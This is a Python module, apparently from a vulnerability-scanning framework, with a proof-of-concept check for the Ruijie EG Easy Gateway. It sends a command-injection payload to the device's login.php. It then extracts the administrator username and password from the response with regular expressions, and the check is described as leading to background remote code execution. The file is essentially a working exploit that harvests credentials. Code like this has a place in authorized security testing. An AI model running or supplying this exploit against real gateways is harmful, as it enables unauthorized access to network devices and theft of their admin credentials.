#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import json
import threading
from thirdparty import requests
from module import globals
from core.verify import verify
from core.verify import misinformation
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.requests.compat import urljoin


class RuiJie():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def time_2021_0424_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Ruijie-EG Easy Gateway: time-2021-0424"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Get account password, background rce"
        self.vul_info["vul_numb"] = "time-2021-0415"
        self.vul_info["vul_apps"] = "RuiJie"
        self.vul_info["vul_date"] = "2021-04-24"
        self.vul_info["vul_vers"] = "unknow"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Get account password, background rce"
        self.vul_info["cre_date"] = "2021-04-26"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/login.php")
        payload = "username=admin&password=admin?show+webmaster+user"
        try:
            request = requests.post(url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
            res = json.loads(request.text)["data"]
            get_user = re.search('admin', res)
            if get_user:
                if r"01. " in res:
                    user = re.findall("00. (.*?) ", res)[0]
                    pasd = re.findall(r"admin (.*)\r\r", res)[0]
                else:
                    user = re.findall("00. (.*?) ", res)[0]
                    pasd = re.findall(r"admin (.*)", res)[0]
                if user and pasd:
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = payload
                    self.vul_info["prt_info"] = "[username:" + user + "] [password:" + pasd + "]"
                elif user:
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["vul_payd"] = payload
                    self.vul_info["prt_info"] = "[user&pass:" + res +"]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

